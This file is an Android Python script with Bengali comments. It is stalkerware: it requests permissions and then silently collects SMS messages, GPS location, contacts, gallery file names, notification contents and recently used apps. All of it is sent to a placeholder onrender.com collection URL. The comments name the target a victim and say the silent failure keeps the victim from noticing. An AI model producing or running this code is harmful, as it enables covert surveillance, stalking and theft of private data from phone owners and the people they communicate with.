import requests, json, time, os, subprocess
from plyer import sms, gps, contacts
from android.permissions import request_permissions, Permission

request_permissions([
    Permission.READ_SMS,
    Permission.ACCESS_FINE_LOCATION,
    Permission.READ_CONTACTS,
    Permission.READ_EXTERNAL_STORAGE,
    Permission.WRITE_EXTERNAL_STORAGE
])

RENDER_URL = "https://তোমার-অ্যাপ.onrender.com/collect"  # এখানে রেন্ডার লিংক বসাও
TOKEN = "survive123"

def send_data(data_type, content):
    try:
        requests.post(RENDER_URL, headers={"X-Token": TOKEN},
                      json={"type": data_type, "data": str(content)[:600]}, timeout=5)
    except Exception as e:
        pass  # নীরব ব্যর্থতা – ভিকটিম টের পাবে না

# ১. SMS
try:
    send_data("sms", sms.get_messages(inbox=True, limit=5))
except: pass

# ২. GPS
try:
    def on_loc(**kw):
        send_data("gps", f"{kw['lat']},{kw['lon']}")
        gps.stop()
    gps.configure(on_location=on_loc)
    gps.start()
    time.sleep(3)
except: pass

# ৩. কন্ট্যাক্ট
try:
    send_data("contacts", contacts.get_contacts()[:400])
except: pass

# ৪. গ্যালারি (শেষ ১০টি ফাইলের নাম + সাইজ)
gallery_list = []
for root, _, files in os.walk("/sdcard/DCIM/"):
    for f in files[:10]:
        if f.lower().endswith(('.jpg','.jpeg','.png','.mp4','.3gp')):
            path = os.path.join(root, f)
            size = os.path.getsize(path) // 1024
            gallery_list.append(f"{f} ({size}KB)")
    break
if not gallery_list:
    for root, _, files in os.walk("/sdcard/Pictures/"):
        for f in files[:10]:
            if f.lower().endswith(('.jpg','.jpeg','.png')):
                path = os.path.join(root, f)
                size = os.path.getsize(path) // 1024
                gallery_list.append(f"{f} ({size}KB)")
        break
send_data("gallery", ", ".join(gallery_list[:5]))

# ৫. নোটিফিকেশন (কার সাথে মেসেজ করছে)
try:
    notif = subprocess.check_output("dumpsys notification | grep -E 'ticker|contentText|sender|title' | head -15", shell=True, text=True, timeout=3)
    if notif.strip():
        send_data("live_chat", notif[:500])
    else:
        notif2 = subprocess.check_output("dumpsys notification --current | grep -E 'text|title' | head -10", shell=True, text=True, timeout=3)
        send_data("live_chat", notif2[:500])
except Exception as e:
    send_data("live_chat", f"নোটিফিকেশন পড়া যায়নি: {str(e)}")

# ৬. বর্তমান খোলা অ্যাপ
try:
    usage = subprocess.check_output("dumpsys usagestats | grep 'package=' | head -5", shell=True, text=True, timeout=3)
    send_data("current_app", usage[:300])
except: pass

print("সব ডেটা পাঠানো হয়েছে।")